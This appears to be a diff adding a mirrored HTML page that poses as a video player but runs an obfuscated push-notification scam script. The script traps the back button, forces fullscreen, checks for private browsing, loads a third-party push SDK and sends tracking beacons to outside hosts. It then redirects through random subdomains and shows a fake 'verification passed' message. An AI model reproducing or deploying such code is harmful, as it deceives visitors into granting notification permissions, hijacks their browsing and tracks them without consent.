@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html>
+<!-- Mirrored from tvnewtop.pro/video-4?h=waWQiOjEwMDA4NjQsInNpZCI6MTAwNTUxNSwid2lkIjo3Njk1LCJzcmMiOjJ9eyJ&bbr=1&si1=&si2= by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Mar 2019 14:54:10 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+
+<head>
+    <meta charset="UTF-8">
+    <title>Video</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,minimum-scale=1">
+    <link rel="icon" type="image/png" sizes="16x16" href="icon.png">
+    <style>
+        body,
+        html {
+            background-color: #000;
+            height: 100%
+        }
+
+        body {
+            -moz-osx-font-smoothing: grayscale;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            -webkit-font-smoothing: antialiased;
+            -webkit-user-select: none;
+            color: #fff;
+            font: 400 16px serif;
+            margin: 0;
+            overflow: hidden;
+            text-align: center;
+            user-select: none
+        }
+
+        .isHide {
+            display: none !important
+        }
+
+        .isShow {
+            display: block !important
+        }
+
+        .video {
+            bottom: 0;
+            left: 0;
+            margin: auto;
+            position: fixed;
+            right: 0;
+            top: 0
+        }
+
+        .video__wDescr {
+            bottom: 50px;
+            left: 0;
+            position: absolute;
+            top: 0;
+            width: 100%
+        }
+
+        .video__loading {
+            -webkit-animation: a 2s linear infinite;
+            animation: a 2s linear infinite;
+            height: 70px;
+            left: 50%;
+            margin: -35px 0 0 -35px;
+            position: absolute;
+            top: 50%;
+            width: 70px
+        }
+
+        .video__wControl {
+            background-color: #000;
+            bottom: 0;
+            height: 50px;
+            left: 1%;
+            position: absolute;
+            right: 1%
+        }
+
+        .video__controlProgress {
+            background-color: hsla(0, 0%, 100%, .2);
+            height: 3px;
+            margin-top: 4px;
+            position: relative
+        }
+
+        .video__controlProgress:before {
+            background-color: #d0021b;
+            content: "";
+            height: 100%;
+            left: 0;
+            position: absolute;
+            top: 0;
+            width: 20%
+        }
+
+        .video__controlLeft,
+        .video__controlRight {
+            margin-top: 8px
+        }
+
+        .video__controlLeft {
+            float: left
+        }
+
+        .video__controlRight {
+            float: right;
+            padding-right: 10px
+        }
+
+        .video__controlRight .video__controlIc:first-child {
+            margin-left: 0
+        }
+
+        .video__controlInfo {
+            float: left;
+            font-family: sans-serif;
+            font-size: 12px;
+            line-height: 29px;
+            margin-left: 10px
+        }
+
+        .video__controlIc {
+            fill: #fff;
+            float: left;
+            height: 27px;
+            margin-left: 10px;
+            width: 27px
+        }
+
+        .msgReady {
+            background-color: rgba(0, 0, 0, .75);
+            height: 100%;
+            left: 0;
+            position: fixed;
+            top: 0;
+            width: 100%
+        }
+
+        .msgReady__tx {
+            font-size: 32px;
+            margin-top: 10%
+        }
+
+        @-webkit-keyframes a {
+            0% {
+                transform: rotate(0)
+            }
+
+            to {
+                transform: rotate(1turn)
+            }
+        }
+
+        @keyframes a {
+            0% {
+                transform: rotate(0)
+            }
+
+            to {
+                transform: rotate(1turn)
+            }
+        }
+
+        @media (min-width:425px) {
+            .msgReady__tx {
+                font-size: 52px
+            }
+        }
+
+        @media (min-width:700px) {
+
+            .video__controlLeft,
+            .video__controlRight {
+                margin-top: 6px
+            }
+
+            .video__controlInfo {
+                line-height: 34px
+            }
+
+            .video__controlIc {
+                height: 32px;
+                width: 32px
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="video">
+        <div class="video__wDescr"><svg class="video__loading" xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 26.349 26.35">
+                <circle fill="#fff" cx="13.792" cy="3.082" r="3.082"></circle>
+                <circle fill="rgba(255,255,255,.6)" cx="13.792" cy="24.501" r="1.849"></circle>
+                <circle fill="rgba(255,255,255,.9)" cx="6.219" cy="6.218" r="2.774"></circle>
+                <circle fill="rgba(255,255,255,.5)" cx="21.365" cy="21.363" r="1.541"></circle>
+                <circle fill="rgba(255,255,255,.8)" cx="3.082" cy="13.792" r="2.465"></circle>
+                <circle fill="rgba(255,255,255,.3)" cx="24.501" cy="13.791" r="1.232"></circle>
+                <path fill="rgba(255,255,255,.7)" d="M4.694,19.84c-0.843,0.843-0.843,2.207,0,3.05c0.842,0.843,2.208,0.843,3.05,0c0.843-0.843,0.843-2.207,0-3.05 C6.902,18.996,5.537,18.988,4.694,19.84z"></path>
+                <circle fill="rgba(255,255,255,.2)" cx="21.364" cy="6.218" r="0.924"></circle>
+            </svg></div>
+        <div class="video__wControl">
+            <div class="video__controlProgress"></div>
+            <div class="video__controlLeft"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" class="video__controlIc isPlay" viewBox="0 0 32 32">
+                    <path d="m9 24 14-8-14-8z"></path>
+                </svg><svg xmlns="http://www.w3.org/2000/svg" version="1.1" class="video__controlIc isGo" viewBox="0 0 32 32">
+                    <path d="m19.9982847 15.3389545-10.9982847-7.3389545v15.9990007l10.9982847-7.3399538v7.3409531h3.0017153v-15.98900756h-3.0017153z"></path>
+                </svg><svg xmlns="http://www.w3.org/2000/svg" version="1.1" class="video__controlIc isSound" viewBox="0 0 32 32">
+                    <path d="m15.7953529 9.04082456c.1257064.06406941.2056128.19737514.2046383.34308139v14.23271095c0 .1457062-.0799064.279012-.2046383.3430814-.0526213.0279012-.1091404.0403017-.1656596.0403017-.0779574 0-.1568893-.0258344-.2221787-.0775033l-5.54374876-4.3288192h-3.11927225c-.41025105 0-.74449359-.3451481-.74449359-.7698664v-4.646066c0-.4247183.33424254-.7698664.74449359-.7698664h3.11927225l5.54374876-4.32985255c.1110894-.0878371.2621319-.10333777.3878383-.03720159zm7.2046471 7.45867724c0 2.2629767-1.0844571 4.2688649-2.747102 5.5004982l-1.252898-1.3691458c1.3172463-.8788839 2.1925716-2.3994927 2.1925716-4.1313524 0-1.7308633-.8753253-3.2514721-2.1925716-4.130356l1.252898-1.3691458c1.6626449 1.2316333 2.747102 3.2375215 2.747102 5.4995018zm-3-.0000037c0 1.4897461-.7231986 2.7907643-1.7970123 3.5005019l-1.2029877-1.4254984c.7688928-.3011616 1.3224956-1.1153018 1.3224956-2.0750035 0-.957694-.5544815-1.7728381-1.3224956-2.0729959l1.2029877-1.4265022c1.0738137.7097376 1.7970123 2.0107558 1.7970123 3.4994981zm2.2948011-7.4994981c2.2528555 1.7418839 3.7051989 4.455703 3.7051989 7.4995 0 3.044797-1.4523434 5.7586161-3.7042143 7.5005l-1.2957857-1.3639091c1.8914927-1.393907 3.120323-3.6247583 3.120323-6.1365909 0-2.5098326-1.2288303-4.7416839-3.120323-6.134591z"></path>
+                </svg>
+                <div class="video__controlInfo">0:13 / 1:47</div>
+            </div>
+            <div class="video__controlRight"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" class="video__controlIc isOptions" viewBox="0 0 32 32">
+                    <path d="m23.242 14.316c.421 0 .758.337.758.741v1.853c0 .421-.337.757-.758.757h-.842c-.32 0-.589.203-.708.505-.033.102-.067.202-.118.304-.134.303-.066.64.153.858l.572.557c.304.303.304.774 0 1.077l-1.314 1.315c-.303.302-.774.302-1.078 0l-.572-.574c-.219-.218-.556-.286-.843-.151-.1.067-.219.101-.336.151-.303.119-.489.405-.489.707v.827c0 .421-.337.757-.758.757h-1.852c-.421 0-.758-.336-.758-.757v-.776c0-.319-.202-.589-.488-.707-.102-.051-.219-.101-.337-.151-.287-.135-.623-.068-.842.151l-.573.572c-.303.304-.775.304-1.078 0l-1.314-1.313c-.303-.303-.303-.774 0-1.078l.59-.589c.219-.236.286-.573.151-.859-.033-.101-.084-.203-.117-.303-.102-.304-.388-.506-.708-.506h-.825c-.421 0-.758-.337-.758-.74v-1.854c0-.421.337-.758.758-.758h.842c.32 0 .589-.202.708-.504.033-.102.067-.186.118-.287.134-.287.066-.64-.153-.859l-.606-.606c-.303-.303-.303-.775 0-1.078l1.314-1.314c.303-.303.775-.303 1.078 0l.606.606c.236.219.573.287.859.152.101-.05.185-.084.287-.117.302-.102.504-.388.504-.708v-.859c0-.421.337-.758.759-.758h1.852c.422 0 .759.337.759.758v.842c0 .32.202.59.504.707.102.034.186.085.287.118.286.135.64.068.859-.151l.606-.607c.303-.302.775-.302 1.078 0l1.314 1.314c.303.304.303.775 0 1.078l-.606.606c-.237.219-.287.573-.153.859.034.085.085.185.118.287.119.303.388.505.708.505zm-7.242 4.632c1.634 0 2.947-1.314 2.947-2.948 0-1.633-1.313-2.947-2.947-2.947s-2.947 1.314-2.947 2.947c0 1.634 1.313 2.948 2.947 2.948z"></path>
+                </svg><svg xmlns="http://www.w3.org/2000/svg" version="1.1" class="video__controlIc isFull" viewBox="0 0 32 32">
+                    <path d="m8.125 17.75v2.625h2.625v2.625h-5.25v-5.25zm13.125-8.75h5.25v5.25h-2.625v-2.625h-2.625zm2.625 11.375v-2.625h2.625v5.25h-5.25v-2.625zm-18.375-6.125v-5.25h5.25v2.625h-2.625v2.625z"></path>
+                </svg><svg xmlns="http://www.w3.org/2000/svg" version="1.1" class="video__controlIc isSave" viewBox="0 0 32 32">
+                    <path d="m22.667958 17.4957586h2.0463774c.1389837 0 .2525019.1136976.2525019.2525019v6.6375006c0 .138625-.1135182.252502-.2525019.252502h-17.42819149c-.13898365 0-.25268125-.113877-.25268125-.252502v-6.6375006c0-.1388043.1136976-.2525019.25268125-.2525019h1.89484037c.13880432 0 .25250191.1136976.25250191.2525019v4.4456836c0 .1388043.1136976.2523226.25250192.2523226h12.47714539c.138625 0 .252502-.1135183.252502-.2523226v-4.4456836c0-.1388043.1136976-.2525019.2523225-.2525019zm-4.8844056-3.2958673v.0001793h2.3103566c.2223739 0 .3014601.1502817.1761058.3337401l-4.041824 5.9239317c-.1255336.1834584-.3303328.1834584-.4556871 0l-4.0420033-5.924111c-.1255336-.1834585-.0460887-.3337401.1761058-.3337401h2.3101773c.2223738 0 .4042183-.1818445.4042183-.404039v-6.39181337c0-.22219451.1818444-.40403893.4042182-.40403893h1.9497165c.2223739 0 .4043976.18184442.4043976.40403893v6.39181337c0 .2221945.1818444.404039.4042183.404039z"></path>
+                </svg></div>
+        </div>
+    </div>
+    <div class="msgReady isHide">
+        <div class="msgReady__tx"></div>
+    </div>
+    <script>
+        ! function(t) {
+            var o = {};
+
+            function i(e) {
+                if (o[e]) return o[e].exports;
+                var n = o[e] = {
+                    i: e,
+                    l: !1,
+                    exports: {}
+                };
+                return t[e].call(n.exports, n, n.exports, i), n.l = !0, n.exports
+            }
+            i.m = t, i.c = o, i.d = function(e, n, t) {
+                i.o(e, n) || Object.defineProperty(e, n, {
+                    enumerable: !0,
+                    get: t
+                })
+            }, i.r = function(e) {
+                "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
+                    value: "Module"
+                }), Object.defineProperty(e, "__esModule", {
+                    value: !0
+                })
+            }, i.t = function(n, e) {
+                if (1 & e && (n = i(n)), 8 & e) return n;
+                if (4 & e && "object" == typeof n && n && n.__esModule) return n;
+                var t = Object.create(null);
+                if (i.r(t), Object.defineProperty(t, "default", {
+                        enumerable: !0,
+                        value: n
+                    }), 2 & e && "string" != typeof n)
+                    for (var o in n) i.d(t, o, function(e) {
+                        return n[e]
+                    }.bind(null, o));
+                return t
+            }, i.n = function(e) {
+                var n = e && e.__esModule ? function() {
+                    return e.default
+                } : function() {
+                    return e
+                };
+                return i.d(n, "a", n), n
+            }, i.o = function(e, n) {
+                return Object.prototype.hasOwnProperty.call(e, n)
+            }, i.p = "", i(i.s = 2)
+        }([function(e, n) {
+            if (0 === "".length) {
+                var t = function() {
+                    void 0 !== this.requestFullScreen ? this.requestFullScreen() : void 0 !== this.webkitRequestFullScreen ? this.webkitRequestFullScreen() : void 0 !== this.mozRequestFullScreen && this.mozRequestFullScreen()
+                };
+                document.body.addEventListener("keydown", t), document.body.addEventListener("click", t)
+            }
+        }, , function(e, n, t) {
+            "use strict";
+            t.r(n);
+            var u = function() {
+                    var e = location.search.split("#")[0].split("?")[1];
+                    if (void 0 === e) return null;
+                    var o = {};
+                    return e.split("&").forEach(function(e) {
+                        var n = e.split("=");
+                        if (2 === n.length) o[n[0]] = n[1] || null;
+                        else {
+                            var t = n[0];
+                            n.shift(), o[t] = n.join("=")
+                        }
+                    }), o
+                },
+                o = u();
+            if (null !== o && void 0 !== o.bbr && "1" === o.bbr) {
+                var i = document.title,
+                    r = location.pathname + location.search;
+                history.pushState(null, i, r), window.addEventListener("popstate", function() {
+                    history.pushState({}, i, r)
+                })
+            }
+            t(0);
+            var a = function(n) {
+                    var e = decodeURIComponent(document.cookie).split(";");
+                    if (0 === e.length) return null;
+                    var t = null;
+                    return e.some(function(e) {
+                        if (" " === e[0] && (e = e.slice(1)), e = e.split("="), n === e[0]) return t = e[1], !0
+                    }), t
+                },
+                d = function(e, n, t, o) {
+                    var i = new Date;
+                    i.setTime(i.getTime() + 1e3 * t);
+                    var r = "; expires=" + i.toUTCString(),
+                        a = "";
+                    void 0 !== o && (a = "; domain=" + o), document.cookie = e + "=" + (n || "") + a + r + "; path=/"
+                },
+                c = function(e, n) {
+                    var t = new XMLHttpRequest;
+                    t.addEventListener("readystatechange", function() {
+                        if (2 === this.readyState && void 0 !== n) return n()
+                    }), t.addEventListener("error", function() {
+                        if (void 0 !== n) return n()
+                    }), t.open("GET.html", e, !0), t.responseType = "text", t.send()
+                },
+                s = function(e, n, t) {
+                    null == n && (n = "tracking");
+                    var o = 0;
+                    "tb" === e ? o = 7 : "private" === e && (o = 12);
+                    var i, r, a = u();
+                    null === a && (a = {}), i = void 0 === a.si1 || null === a.si1 ? "" : a.si1, r = void 0 === a.si2 || null === a.si2 ? "" : a.si2, i = i.slice(0, 32), r = r.slice(0, 32);
+                    var s = "https://nativenote.pro/rpe?" + ["a=1", "s=1", "act=" + o, "src=2", "p=1000864", "st=1005515", "wd=7695", "d=tvnewtop.pro", "tpl=22", "rnd=" + Math.random(), "sbid=" + encodeURIComponent(i), "sbid2=" + encodeURIComponent(r)].join("&");
+                    c(s, function() {
+                        if (d(n, "1", 86400, "tvnewtop.pro"), void 0 !== t) return t()
+                    })
+                },
+                l = function(e) {
+                    null !== window.opener && void 0 !== window.opener && opener.postMessage(e, "*")
+                },
+                f = function(e, n) {
+                    var t = "https://newsfresh.pro/tb?h=waWQiOjEwMDA4NjQsInNpZCI6MTAwNTUxNSwid2lkIjo3Njk1LCJzcmMiOjJ9eyJ&amp;bbr=1&amp;si1=&amp;si2=";
+                    if (0 !== t.length) s("tb", null, function() {
+                        l({
+                            a: n ? "success" : "close"
+                        }), location.href = t
+                    });
+                    else if (void 0 !== e) return e(n)
+                },
+                v = {
+                    ua: navigator.userAgent,
+                    m: function(n) {
+                        var e = "normal",
+                            t = "private";
+
+                        function o() {
+                            return n(t)
+                        }
+
+                        function i() {
+                            return n(e)
+                        }
+                        if ("safari" === v.n) try {
+                            return window.openDatabase(null, null, null, null), n(e)
+                        } catch (e) {
+                            return n(t)
+                        } else if ("firefox" === v.n) {
+                            var r = indexedDB.open("test.html");
+                            r.addEventListener("error", o), r.addEventListener("success", i)
+                        } else {
+                            if ("edge" === v.n) return void 0 !== window.indexedDB || void 0 === window.PointerEvent && void 0 === window.MSPointerEvent ? n(e) : n(t);
+                            if ("opera" !== v.n && "yandex" !== v.n && "chrome" !== v.n) return n("unknown");
+                            window.webkitRequestFileSystem(window.TEMPORARY, 1, i, o)
+                        }
+                    },
+                    get n() {
+                        var e = !!window.opr && !!opr.addons || !!window.opera || 0 < this.ua.indexOf("OPR/index.html"),
+                            n = "undefined" != typeof InstallTrigger,
+                            t = /constructor/i.test(window.HTMLElement) || /(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/.test(this.ua),
+                            o = !!window.chrome && /Google Inc/.test(navigator.vendor),
+                            i = 0 < this.ua.indexOf("YaBrowser") || 0 < this.ua.indexOf("Yowser"),
+                            r = /UBrowser/.test(this.ua),
+                            a = /Edge\//.test(this.ua),
+                            s = null;
+                        return e ? s = "opera" : n ? s = "firefox" : i ? s = "yandex" : r ? s = "uc" : a ? s = "edge" : o ? s = "chrome" : t && (s = "safari"), s
+                    },
+                    get d() {
+                        var n = {
+                                webOS: "webOS",
+                                iPhone: "iPhone",
+                                iPad: "iPad",
+                                iPod: "iPod",
+                                mac: "(MacPPC|MacIntel|Mac_PowerPC|Macintosh)",
+                                blackBerry: "BlackBerry|BB|PlayBook",
+                                windows: "Windows NT",
+                                windowPhone: "Windows Phone",
+                                android: "Android"
+                            },
+                            t = null;
+                        return Object.keys(n).some(function(e) {
+                            if (null !== v.ua.match(new RegExp(n[e], "i"))) return t = e, !0
+                        }), t
+                    }
+                },
+                p = v,
+                w = u(),
+                h = {
+                    c: 0,
+                    s: !0,
+                    r: parseInt("0", 10),
+                    next: function() {
+                        var e, n = "?",
+                            i = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"];
+                        i.forEach(function(e, n) {
+                            var t = Math.floor(Math.random() * (n + 1)),
+                                o = [i[t], i[n]];
+                            i[n] = o[0], i[t] = o[1]
+                        }), e = i.slice(0, 5).join(""), h.c++, null === w ? w = {
+                            i: h.c
+                        } : w.i = h.c, Object.keys(w).forEach(function(e) {
+                            null !== w[e] && (n += e + "=" + w[e] + "&")
+                        }), n = n.slice(0, -1), l({
+                            a: "next",
+                            c: h.c
+                        }), location.href = "https://" + e + ".tvnewtop.pro/video-4" + n
+                    },
+                    get can() {
+                        return this.s
+                    }
+                };
+            null !== w && void 0 !== w.i && (h.c = parseInt(w.i, 10)), 0 < h.r && (h.s = h.c < h.r);
+            var m = h,
+                g = function(n) {
+                    if (!(void 0 !== window.navigator && void 0 !== navigator.serviceWorker && void 0 !== window.PushManager && void 0 !== window.Notification)) return n(!1, "unsupported");
+                    p.m(function(e) {
+                        return "private" === e ? n(!1, e) : "unknown" === e ? n(!1, e) : n(!0, "supported")
+                    })
+                },
+                y = {
+                    k: "",
+                    t: {},
+                    set: function(e) {
+                        void 0 !== window.navigator && void 0 !== navigator.language && (y.k = navigator.language.slice(0, 2)), void 0 === e[y.k] && (y.k = "en"), y.t = e[y.k]
+                    },
+                    get: function(e) {
+                        return y.t[e]
+                    }
+                },
+                b = y;
+
+            function R(e) {
+                l({
+                    a: e ? "success" : "close"
+                }), null !== window.opener && void 0 !== window.opener && close(), document.querySelector(".video").classList.add("isHide"), document.querySelector(".msgReady").classList.remove("isHide")
+            }
+            var P = "convert";
+            if (m.can)
+                if ("firefox" === p.n && 2 === location.hostname.split(".").length) m.next();
+                else if (null !== a(P)) f(R, 1);
+            else {
+                var S = function() {
+                    window.edPushSDK.push(arguments)
+                };
+                window.edPushSDK = window.edPushSDK || [], S("onGranted", function() {
+                    d(P, "1", 604800, "tvnewtop.pro");
+                    var e = "";
+                    0 !== e.length ? c(e, function() {
+                        f(R, 1)
+                    }) : f(R, 1)
+                }), S("onDenied", function() {
+                    g(function(e) {
+                        e && m.next()
+                    })
+                }), S("onClose", function() {
+                    location.reload()
+                }), S("onSubscribed", function() {
+                    f(R, 1)
+                }), S("onError", function(e) {
+                    console.log(e)
+                });
+                var O = document.createElement("script");
+                O.async = !0, O.src = "https://serviceproworker.com/v1/sdk.js?h=waWQiOjEwMDA4NjQsInNpZCI6MTAwNTUxNSwid2lkIjo3Njk1LCJzcmMiOjJ9eyJ&amp;d=tvnewtop.pro&amp;tpl=22", document.head.appendChild(O), g(function(e, n) {
+                    e || ("private" === n ? s(n, null, f(R)) : f(R))
+                })
+            } else f(R);
+            b.set({
+                en: {
+                    msgReady: "You have successfully passed the verification!<br>Now you can close the window."
+                },
+                uk: {
+                    msgReady: "Ви успішно пройшли перевірку!<br>Тепер ви можете закрити вікно."
+                },
+                pl: {
+                    msgReady: "Pomyślnie przeszedłeś weryfikację!<br>Teraz możesz zamknąć okno."
+                },
+                ru: {
+                    msgReady: "Вы успешно прошли проверку!<br>Теперь вы можете закрыть окно ..."
+                },
+                fr: {
+                    msgReady: "Vous avez réussi le test!<br>Maintenant vous pouvez fermer la fenêtre"
+                },
+                de: {
+                    msgReady: "Sie haben den Test erfolgreich bestanden!<br>Jetzt können Sie das Fenster schließen"
+                },
+                es: {
+                    msgReady: "Has pasado la prueba con éxito!<br>Ahora puedes cerrar la ventana"
+                },
+                th: {
+                    msgReady: "คุณผ่านการตรวจสอบสำเร็จแล้ว!<br>ตอนนี้คุณสามารถปิดหน้าต่างได้"
+                }
+            }), null !== window.opener && document.body.classList.add("isPopup"), "yandex" === p.n && document.body.classList.add("isYandex"), document.querySelector(".msgReady__tx").innerHTML = b.get("msgReady")
+        }]);
+    </script>
+</body>
+<!-- Mirrored from tvnewtop.pro/video-4?h=waWQiOjEwMDA4NjQsInNpZCI6MTAwNTUxNSwid2lkIjo3Njk1LCJzcmMiOjJ9eyJ&bbr=1&si1=&si2= by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Mar 2019 14:54:13 GMT -->
+
+</html>
